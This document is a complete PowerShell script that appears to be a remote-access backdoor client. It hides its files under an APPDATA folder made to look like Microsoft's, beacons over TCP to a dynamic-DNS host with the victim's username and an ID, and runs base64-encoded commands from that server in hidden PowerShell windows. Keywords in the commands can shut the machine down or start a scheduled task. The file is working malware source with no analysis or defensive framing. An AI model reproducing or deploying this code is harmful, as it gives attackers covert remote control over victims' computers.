$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) {
  exit
}

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) {
  exit
}

$VPS_HOST = "runx.ddns.net"
$VPS_PORT = 5003
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "ab44043"
$clientVersion = $SCRIPT_VERSION

$logDir = "$env:APPDATA\Microsoft\run"
if (-not (Test-Path $logDir)) {
  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}
$logFile = "$logDir\run.log"

function Log-Msg($msg) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

Log-Msg "[INFO] run.ps1 started. Acquired mutexes."
Log-Msg "[INFO] Client: $uniqueUser, Version: $clientVersion"

function Execute-CommandPayload ($r) {
  if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
    $c = [System.Text.Encoding]::UTF8.GetString(
      [System.Convert]::FromBase64String($r.cmd)
    )
    Log-Msg "[INFO] Received command payload. Command: $c"

    if ($c -match "panic") {
      Log-Msg "[INFO] Command matched 'panic'. Exiting."
      exit
    }
    elseif ($c -match "altf4") {
      Log-Msg "[INFO] Command matched 'altf4'. Shutting down system."
      Start-Process `
        -FilePath "shutdown" `
        -ArgumentList "/s", "/t", "0" `
        -WindowStyle Hidden
    }
    elseif ($c -match "sauce") {
      Log-Msg "[INFO] Command matched 'sauce'. Starting WinRunInstaller scheduled task."
      Start-ScheduledTask `
        -TaskName "WinRunInstaller"
    }
    else {
      $style = if ($r.visible -eq $true) {
        "Normal"
      }
      else {
        "Hidden"
      }

      Log-Msg "[INFO] Executing PowerShell command (WindowStyle: $style)..."
      Start-Process powershell.exe `
        -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
        $c
      ) -WindowStyle $style
    }
  }
}

try {
  while ($true) {
    try {
      Log-Msg "[INFO] Connecting to TCP socket $VPS_HOST:$VPS_PORT..."
      $tcpClient = New-Object System.Net.Sockets.TcpClient
      $tcpClient.Connect($VPS_HOST, $VPS_PORT)

      if ($tcpClient.Connected) {
        Log-Msg "[INFO] TCP connection established successfully."
        $stream = $tcpClient.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        $hsObj = @{ username = $uniqueUser; version = $clientVersion; client_type = "cmd" } | ConvertTo-Json -Compress
        $writer.WriteLine($hsObj)

        while ($tcpClient.Connected) {
          $line = $reader.ReadLine()
          if ($null -eq $line) {
            Log-Msg "[INFO] Server closed TCP connection."
            break
          }

          if ($line -match '"type":\s*"ping"') {
            $writer.WriteLine('{"type":"pong"}')
            continue
          }

          Log-Msg "[INFO] Received TCP payload: $line"
          $r = $line | ConvertFrom-Json
          Execute-CommandPayload $r
        }
      }
    }
    catch {
      Log-Msg "[ERROR] TCP Connection Error: $($_.Exception.ToString())"
    }
    finally {
      if ($tcpClient) {
        $tcpClient.Close()
        $tcpClient.Dispose()
      }
    }

    Log-Msg "[INFO] Reconnecting in 3 seconds..."
    Start-Sleep -Seconds 3
  }
}
finally {
  if ($m1) {
    $m1.ReleaseMutex()
    $m1.Dispose()
  }

  if ($m2) {
    $m2.ReleaseMutex()
    $m2.Dispose()
  }
}
